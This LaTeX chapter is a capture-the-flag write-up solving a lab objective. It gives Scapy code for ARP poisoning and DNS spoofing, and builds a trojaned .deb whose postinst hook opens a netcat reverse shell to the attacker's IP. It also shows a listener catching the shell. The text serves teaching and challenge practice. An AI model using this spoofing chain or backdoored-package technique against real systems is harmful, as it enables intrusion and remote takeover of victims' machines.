\chapter{Objective 9 - How To}
Based on the objective description and a quick \textit{tcpdump},
our heroes need to:
\begin{itemize}
\item Poison ARP. When this is done, another network monitoring will reveal that we need to respond to some DNS request.
\item Respond to DNS. When this is done, yet another network monitoring will reveal that the victim tries to get access to some debs.
\item Manufacture DEB so that we get reverse shell.
\item Set up listener for our reverse shell.
\end{itemize}

Based on the above, the first script we need to modify is the ARP\footnote{Please note, those scripts only respond to the first request and exit.}
\begin{minted}{python}
v_macaddr = packet[ARP].hwsrc
v_ipaddr = packet[ARP].psrc

ether_resp = Ether(dst=v_macaddr, type=0x806, src=macaddr)

arp_response = ARP(pdst=v_ipaddr)
arp_response.op = 0x2 # Response
arp_response.plen = 0x4
arp_response.hwlen = 6
arp_response.ptype = 0x800
arp_response.hwtype = 0x1

arp_response.hwsrc = macaddr # Our MAC
arp_response.psrc = "10.6.6.53" # Our IP, or at least the one he wants to talk to.
arp_response.hwdst = v_macaddr # Victim MAC
arp_response.pdst = v_ipaddr # Victim IP

\end{minted}
Your DNS script should be modified like
\begin{minted}{python}
ipaddr_we_arp_spoofed = "10.6.6.53"

def handle_dns_request(packet):
    # Need to change mac addresses, Ip Addresses, and ports below.
    # We also need
    eth = Ether(src=macaddr, dst="4c:24:57:ab:ed:84")   # need to replace mac addresses
    ip  = IP(dst="10.6.6.35", src=ipaddr_we_arp_spoofed)                          # need to replace IP addresses
    udp = UDP(dport=packet[UDP].sport, sport=53)                             # need to replace ports
    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa = 1,
        qr=1,
        an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=ipaddr)
    )
    dns_response = eth / ip / udp / dns
\end{minted}

We already know because we tcpdump'd that there's a request coming on port 80.
\begin{minted}{bash}
guest@bdde251c6a87:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.6.6.35 - - [27/Dec/2020 19:35:00] code 404, message File not found
10.6.6.35 - - [27/Dec/2020 19:35:00] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
\end{minted}

We need to put together a .deb file that will trigger us some sort of vuln\footnote{\href{https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/}{Here} is a more descriptive way}.
\begin{minted}{bash}
guest@bdde251c6a87:~/debs$ dpkg -x unzip_6.0-25ubuntu1_amd64.deb work
guest@bdde251c6a87:~/debs$ mkdir work/DEBIAN
guest@bdde251c6a87:~/debs$ cat work/DEBIAN/control
Package: suriv
Version: 6.0
Section: Pwnage
Priority: optional
Architecture: amd64
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based pwnage
 Grinch and Cindy Lou love you. Now they'll fix your server
 guest@bdde251c6a87:~/debs$ cat work/DEBIAN/postinst
 #!/bin/bash
 # Note that the IP is what's in his cache.
 /usr/bin/netcat 10.6.6.53 1234 -e /bin/bash
 guest@bdde251c6a87:~/debs$ chmod +x work/DEBIAN/postinst
 guest@bdde251c6a87:~/debs$ dpkg-deb --build work/
 guest@bdde251c6a87:~/debs$ mkdir -p pub/jfrost/backdoor/
 guest@bdde251c6a87:~/debs$ mv work.deb pub/jfrost/backdoor/suriv_amd64.deb
\end{minted}

Alright, time to get a shell. We need to fire our two scripts, the server and have a listening backdoor.

\begin{minted}{bash}
guest@53ee527cbffd:~/debs$ nc -nvlp 1234 &
guest@53ee527cbffd:~/debs$ python3 -m http.server 80 &
guest@53ee527cbffd:~/debs$ python3 ../scripts/dns_resp.py &
guest@53ee527cbffd:~/debs$ python3 ../scripts/arp_resp.py
.
Sent 1 packets.
.
Sent 1 packets.
10.6.6.35 - - [27/Dec/2020 20:17:01] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
guest@53ee527cbffd:~/debs$ connect to [10.6.0.2] from (UNKNOWN) [10.6.6.35] 54298
guest@53ee527cbffd:~/debs$ fg
nc -nvlp 1234
whoami
jfrost
cat /N*.txt
\end{minted}
Tanta Kringle was the answer. As a bonus, you can actually transfer the file to host. 
